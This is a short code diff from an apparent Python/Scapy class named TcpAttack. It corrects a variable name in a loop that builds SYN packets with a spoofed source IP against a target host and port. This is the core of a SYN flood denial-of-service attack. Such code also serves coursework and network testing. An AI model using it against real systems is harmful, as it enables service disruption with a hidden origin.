@@ -32,7 +32,7 @@ class TcpAttack():
 
         if testport == 1:
             for i in range(numSyn):
-                IP_header = IP(src =self.spoof, dst=self.targetIP)
+                IP_header = IP(src =self.spoofIP, dst=self.targetIP)
                 TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
                 packet =  IP_header / TCP_header
                 try:
